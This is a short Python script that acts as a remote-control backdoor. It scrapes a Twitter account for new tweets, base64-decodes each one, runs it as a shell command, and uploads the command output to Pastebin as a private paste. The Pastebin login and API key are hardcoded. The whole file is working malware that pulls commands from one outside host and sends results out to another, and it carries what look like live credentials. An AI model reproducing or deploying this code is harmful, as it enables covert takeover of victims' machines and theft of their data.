from bs4 import BeautifulSoup as mySoup
from urllib.request import urlopen
from pastebin import PastebinAPI
import base64, os, requests, subprocess

global USERNAME
global PASSWORD
global API_DEV_KEY
USERNAME = '0xt3d'
PASSWORD = 'Azerty365500'
API_DEV_KEY = '4cc9ee208e73fe10691e45ddc0696655'

def getAPIUserKey():
    global USERNAME, PASSWORD, API_DEV_KEY
    data = {'api_dev_key': API_DEV_KEY,
            'api_user_name': USERNAME,
            'api_user_password': PASSWORD}
    resp = requests.post('https://pastebin.com/api/api_login.php', data=data)
    return resp.text

def postText2PasteBin(text):
    global API_DEV_KEY
    key = getAPIUserKey()
    data = {
        'api_dev_key': API_DEV_KEY,
        'api_paste_code': text,
        'api_paste_private': '2',
        'api_option': 'paste',
        'api_user_key': key
    }
    resp = requests.post('https://pastebin.com/api/api_post.php', data=data)
    print(resp.text)

def main():
    lastTweet = ''
    while True:
        html = urlopen('https://twitter.com/S1mpleCC')
        soup = mySoup(html,"html.parser")
        tweets = soup.findAll('li',{"class":'js-stream-item'})
        for tweet in tweets:
            if tweet.find('p',{"class":'tweet-text'}):
                text = str(tweet.find('p',{"class":'tweet-text'}).get_text())
                if text != lastTweet:
                    payload = base64.b64decode(text.encode("utf-8")).decode("utf-8")
                    cmd = subprocess.Popen(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    outBytes = cmd.stdout.read() + cmd.stderr.read()
                    outStr = str(outBytes, "latin1")
                    postText2PasteBin(outStr)
                    lastTweet = text
                    break
            break

main()
